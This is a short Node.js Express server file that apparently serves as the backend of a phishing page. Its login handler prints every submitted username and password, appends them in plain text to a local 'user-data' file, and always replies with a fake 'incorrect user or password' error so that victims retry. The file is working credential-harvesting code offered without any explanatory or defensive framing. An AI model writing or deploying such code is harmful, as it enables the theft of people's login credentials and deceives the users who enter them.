const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');

let app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use('/', (req, res, next) => {
    //console.log(req.url);
    next();
})

app.post('/login-form', (req, res) => {

    console.log(req.body.username);
    console.log(req.body.password);
    fs.appendFileSync(path.join(__dirname, '/user-data'), `user: ${req.body.username}\npass: ${req.body.password}\n`);
    res.send('ERROR: incorrect user or password\n\n\nTry again')
})

app.use(express.static(path.join(__dirname, '../public')));

app.listen(3000)